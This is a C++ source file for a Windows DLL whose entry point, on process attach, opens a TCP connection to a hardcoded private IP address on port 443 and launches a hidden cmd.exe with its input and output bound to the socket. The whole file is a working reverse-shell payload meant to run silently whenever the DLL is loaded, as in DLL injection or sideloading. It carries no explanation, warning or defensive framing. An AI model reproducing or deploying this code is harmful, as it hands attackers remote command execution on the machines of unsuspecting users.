// dllmain.cpp : 定义 DLL 应用程序的入口点。
#include "stdafx.h"
#include <winsock2.h>
#include <stdlib.h>

#pragma comment(lib,"ws2_32")
void Reverse_Shell();

WSADATA wsaData;
SOCKET Winsock;
SOCKET Sock;
struct sockaddr_in hal;

STARTUPINFO ini_processo;
PROCESS_INFORMATION processo_info;

BOOL APIENTRY DllMain( HMODULE hModule,
                       DWORD  ul_reason_for_call,
                       LPVOID lpReserved
                     )
{
    switch (ul_reason_for_call)
    {
    case DLL_PROCESS_ATTACH:
		Reverse_Shell();
		break;
    case DLL_THREAD_ATTACH:
    case DLL_THREAD_DETACH:
    case DLL_PROCESS_DETACH:
        break;
    }
    return TRUE;
}

void Reverse_Shell()
{
	LPCSTR szMyUniqueNamedEvent = "nullevt";
	HANDLE m_hEvent = CreateEventA(NULL, TRUE, FALSE, szMyUniqueNamedEvent);

	switch (GetLastError())
	{
		// app is already running
	case ERROR_ALREADY_EXISTS:
	{
		CloseHandle(m_hEvent);
		break;
	}

	case ERROR_SUCCESS:
	{

		break;
	}
	}


	WSAStartup(MAKEWORD(2, 2), &wsaData);
	Winsock = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, (unsigned int)NULL, (unsigned int)NULL);

	hal.sin_family = AF_INET;
	hal.sin_port = htons(atoi("443"));

	hal.sin_addr.s_addr = inet_addr("172.31.139.141");
	WSAConnect(Winsock, (SOCKADDR*)&hal, sizeof(hal), NULL, NULL, NULL, NULL);

	memset(&ini_processo, 0, sizeof(ini_processo));
	ini_processo.cb = sizeof(ini_processo);
	ini_processo.dwFlags = STARTF_USESTDHANDLES;
	ini_processo.hStdInput = ini_processo.hStdOutput = ini_processo.hStdError = (HANDLE)Winsock;

	CreateProcessA(NULL, (LPSTR)"cmd.exe", NULL, NULL, TRUE, CREATE_NO_WINDOW, NULL, NULL, (LPSTARTUPINFOA)&ini_processo, &processo_info);

}
